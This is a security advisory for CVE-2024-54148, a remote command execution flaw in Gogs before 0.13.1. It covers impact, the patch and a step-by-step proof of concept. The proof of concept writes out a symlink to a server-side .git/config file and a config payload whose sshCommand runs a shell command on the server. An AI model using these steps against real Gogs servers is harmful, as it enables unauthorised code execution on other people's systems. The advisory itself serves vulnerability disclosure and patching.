# Remote Command Execution in file editing in gogs

**GHSA**: GHSA-r7j8-5h9c-f6fx | **CVE**: CVE-2024-54148 | **Severity**: high (CVSS 9.8)

**CWE**: CWE-22

**Affected Packages**:
- **gogs.io/gogs** (go): < 0.13.1

## Description

### Impact

The malicious user is able to commit and edit a crafted symlink file to a repository to gain SSH access to the server. 

### Patches

Editing symlink while changing the file name has been prohibited via the repository web editor (https://github.com/gogs/gogs/pull/7857). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

n/a

### Proof of Concept

1. Create two repositories, upload something to the first repository, edit any file, and save it on the webpage.
2. In the second repository, create a symbolic link to the file you need to edit:
    ```bash
    $ ln -s /data/gogs/data/tmp/local-repo/1/.git/config test
    $ ls -la
    total 8
    drwxr-xr-x   5 dd  staff  160 Oct 27 19:09 .
    drwxr-xr-x   4 dd  staff  128 Oct 27 19:06 ..
    drwxr-xr-x  12 dd  staff  384 Oct 27 19:09 .git
    -rw-r--r--   1 dd  staff   12 Oct 27 19:06 README.md
    lrwxr-xr-x   1 dd  staff   44 Oct 27 19:09 test -> /data/gogs/data/tmp/local-repo/1/.git/config
    $ git add .
    $ git commit -m 'ddd'
    $ git push -f
    ```

3. Go back to the webpage, edit the symbolic file in the second repository, with the following content, change the filename, and save (here you can notice, with filename changed the symbolic file edit limit is bypassed)
    ```
    [core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    ignorecase = true
    precomposeunicode = true
    sshCommand = echo pwnned > /tmp/poc
    [remote "origin"]
    url = [git@github.com](mailto:git@github.com):torvalds/linux.git
    fetch = +refs/heads/*:refs/remotes/origin/*
    [branch "master"]
    remote = origin
    merge = refs/heads/master
    ```

4. Go back to the first repo, edit something, and commit again, you can notice a file called `/tmp/poc` created on the server.

### For more information
If you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/7582.
